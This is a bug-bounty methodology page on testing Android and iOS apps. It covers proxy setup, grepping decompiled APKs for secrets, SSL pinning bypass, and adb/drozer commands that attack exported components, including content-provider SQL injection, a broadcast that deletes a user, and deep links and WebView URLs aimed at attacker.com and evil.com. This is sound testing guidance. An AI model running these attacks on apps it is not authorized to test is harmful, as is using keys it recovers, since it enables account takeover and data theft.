# Mobile Pentest (Android APK / iOS IPA)

If an APK/IPA is in scope, run this (Rule 7). Mobile ships a **less-hunted surface**: base URLs, API
endpoints, header schemes, and hardcoded secrets the web app never exposes. Recovered endpoints/secrets
feed back into the ledger as fresh assets.

## Runtime-first — the one rule
**Do NOT start by decompiling.** Order:
```
1. Install app on device/emulator   2. Point it at Burp/mitmproxy
3. Drive real flows by hand (login, pay, edit, share)
4. Traffic visible + replayable → STOP reversing, test the API like a web target
5. Traffic pinned/encrypted/absent → THEN escalate to apktool/jadx/Frida
```
Most paid mobile bugs (IDOR, auth bypass, business logic) come from replaying plain HTTP in Burp.
Reversing is a support step to get traffic flowing, not the goal.

## Scope traps
Is the **app package** (`com.target.app`) in scope, or only web domains? If only `*.target.com`, the
**API endpoints** the app calls are usually in scope but the binary analysis may not be — check.
Third-party SDKs (Firebase/Sentry/AppsFlyer/ads) are out of scope. Don't report "debuggable" /
"no root detection" / "no obfuscation" — N/A on almost every program.

## Setup
```bash
adb install target.apk                 # or pull a live install
# Route device through Burp: Wi-Fi proxy = <laptop-ip>:8080, install Burp CA as a *system* cert
# (apps targeting API 24+ ignore user certs — push to /system/etc/security/cacerts on root,
#  or objection patchapk to inject a network_security_config trusting user certs)
mitmproxy --listen-port 8080
apktool d target.apk -o target_src     # smali + manifest (recompilable)
jadx -d target_jadx target.apk         # DEX → readable Java
pip install frida-tools objection      # Frida 16.7.x = stable bug-bounty pick
```

## Static sweep — highest-ROI 5 minutes 🔑
```bash
apktool d target.apk -o target_src
grep -rn "api_key\|secret\|password\|token\|Authorization\|Bearer\|client_secret\|private_key" \
  target_src/ --include="*.smali" --include="*.xml"
grep -rn "https://" target_src/ | grep -viE "schema|xmlns|android|google|w3.org|apache" | sort -u
grep -rniE "firebaseio\.com|amazonaws\.com|s3\.|googleapis|cloudfront|\.blob\.core" target_src/
apkleaks -f target.apk -o target_apkleaks.txt      # endpoints + secrets in one pass
```
| Found | Action — prove impact now |
|---|---|
| `internal-/staging.target.com` base URL not in web recon | httpx + recon it → fresh, often weak-auth surface |
| Live API key (Maps/AWS/Algolia/Mapbox/SendGrid) | call the API as the key; unkeyed billing = $$ |
| Endpoint web app never calls (`/api/internal/`, `/admin/`, `/debug/`) | hit from Burp with your session → IDOR/admin |
| Hardcoded backend password / basic-auth | verify it authenticates against the live host |

## Network-layer testing (treat like web)
`baseline → stable replay → smallest mutation → compare status/body/timing/side-effect → expand by class`.
Mobile apps love `X-User-Id`/`deviceId` headers the server trusts → horizontal IDOR. Diff the app's
endpoints against the web app's — the app frequently hits older, less-reviewed `/v1/` routes directly.
Then apply [authz-idor.md](authz-idor.md), [backend-classes.md](backend-classes.md), [graphql.md](graphql.md).

## Keychain/keystore persistence (iOS specifically)
iOS Keychain entries survive app **delete + reinstall** by default (they're tied to the device, not the
app install). If a session token/credential lands in Keychain and the app doesn't explicitly clear it on
logout or detect "fresh install," a resold, factory-reset-skipped, or shared device lets the next person
who installs the app inherit the previous user's session — a real disclosed ATO vector. Test: log in, note
the session, delete the app, reinstall, check whether you're still authenticated as the same user without
re-entering credentials.

## SSL pinning bypass (when traffic is blank)
```bash
objection patchapk -s target.apk --ignore-nativelibs --gadget-version 16.7.19
adb install target.objection.apk
objection -g com.target.app explore     # then: android sslpinning disable
```
Custom/obfuscated pinning → Frida hook `okhttp3.CertificatePinner.check()` (no-op) and the
`X509TrustManager.checkServerTrusted()` chain. iOS (jailbroken): `ios sslpinning disable`.
Pinning bypass is a support step, not a finding.

---

## MOBILE CLASS ADDITIONS

### Exported Components (Android)
```bash
# Enumerate all exported components:
adb shell dumpsys package com.target.app | grep -A2 "exported=true"
# Or use drozer:
drozer console connect
dz> run app.package.info -a com.target.app
dz> run app.activity.info -a com.target.app     # exported activities
dz> run app.service.info -a com.target.app      # exported services
dz> run app.broadcast.info -a com.target.app    # exported receivers
dz> run app.provider.info -a com.target.app     # content providers

# Attack exported activity (bypass login screen):
adb shell am start -n com.target.app/.activities.MainActivity
adb shell am start -n com.target.app/.activities.AdminActivity

# Attack exported content provider (dump data):
dz> run app.provider.query content://com.target.app.provider/users
# SQLi via content provider:
dz> run app.provider.query content://com.target.app.provider/users \
    --projection "* FROM users--"

# Attack exported broadcast receiver (trigger privileged action):
adb shell am broadcast -a com.target.app.ACTION_DELETE_USER --ei user_id 123
```

### Intent Redirection / PendingIntent Misuse
```bash
# An exported activity receives an intent, extracts a nested intent, and starts it
# Attacker can control the nested intent to reach unexported components:

# PoC app code (Frida or ADB):
adb shell am start -n com.target.app/.ForwarderActivity \
  --eu target_intent "intent:#Intent;component=com.target.app/.AdminActivity;end"

# PendingIntent with implicit base: attacker app intercepts PendingIntent
# and uses it to perform actions with the victim app's identity
# Test: does the app send PendingIntents with blank actions/component? → can be intercepted
```

### Custom URL Schemes / Deep Links
```bash
# Extract all deep link schemas and hosts from AndroidManifest.xml:
apktool d app.apk -o app_decompiled
grep -r "scheme\|host\|pathPrefix\|action.*VIEW" app_decompiled/AndroidManifest.xml

# Test deep link handler:
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://reset-password?token=ATTACKER_TOKEN"
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://webview?url=https://attacker.com"

# Deep link auth bypass (skip login screen by deep-linking to authenticated view):
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://dashboard/home"
# If the app renders the dashboard without checking authentication → auth bypass

# Token in deep link:
# If the app receives access_token in a deep link: targetapp://oauth?access_token=JWT
# Another app that intercepts this deep link gets the token
# Test: register an app with the same URL scheme
```

### App Links / AASA Misconfiguration
```bash
# Android App Links (assetlinks.json):
curl "https://target.com/.well-known/assetlinks.json"
# If missing or wrong package hash → any app can claim those links → token theft on OAuth
# iOS AASA (apple-app-site-association):
curl "https://target.com/.well-known/apple-app-site-association"
# If missing → Safari opens the link in browser instead of app → may expose tokens in URLs
```

### WebView Attacks
```bash
# addJavascriptInterface + file access → JS bridge RCE:
# Check decompiled code for: setJavaScriptEnabled(true) + addJavascriptInterface()
grep -r "addJavascriptInterface\|setAllowFileAccess\|setAllowUniversalAccessFromFileURLs" \
  app_decompiled/

# If addJavascriptInterface is present:
# Access file:// URLs from an attacker page loaded in the WebView:
# file:///data/data/com.target.app/shared_prefs/credentials.xml

# shouldOverrideUrlLoading gaps:
# Check if WebView loads URLs from intent extras without validation:
# intent://target.com#Intent;scheme=https;S.browser_fallback_url=https://evil.com;end
adb shell am start -a android.intent.action.VIEW \
  -d "intent://target.com#Intent;scheme=https;S.browser_fallback_url=https://evil.com;end"
```

### App-vs-Web Auth Differential (/v1 vs /v2 endpoints)
```bash
# Decompile the app and grep for API endpoints:
grep -r "api/v1\|/mobile\|/android\|/ios" app_decompiled/smali/ | grep "const-string"
# Or via Frida to intercept live API calls:
frida -U -n com.target.app -l intercept_http.js

# Test each mobile-specific endpoint for weaker authz:
# Mobile apps often call /api/v1/ while web calls /api/v2/ (auth was tightened only on v2)
curl "https://target.com/api/v1/admin/users" -H "Authorization: Bearer MOBILE_SESSION_TOKEN"
curl "https://target.com/api/mobile/account" -H "X-App-Version: 1.0.0"

# Certificate pinning bypass (for MITM with Burp):
# Frida:
frida -U -n com.target.app -l ssl_pinning_bypass.js
# Or: apktool decompile → patch NetworkSecurityConfig.xml → repack → install
```

### Task Hijacking (StrandHogg)
```bash
# App with taskAffinity + allowTaskReparenting → attacker app positions itself over victim app
# Modern Android (11+) largely mitigated — but check:
grep -r "taskAffinity\|allowTaskReparenting\|launchMode" app_decompiled/AndroidManifest.xml
# If launchMode="singleTask" + taskAffinity set → test task hijacking with PoC app
```

### Fix-Bypass Hunting on Mobile (re: §52 mindset)
```bash
# Mobile apps are updated frequently — check version history:
# APKPure, APKMirror: download older versions
# Compare API calls across versions: did the new version add auth to an endpoint?
# The OLD endpoint may still work with OLD app version (or just the raw API call)
curl "https://target.com/api/v1/old-endpoint" -H "X-App-Version: 1.0.0"
```
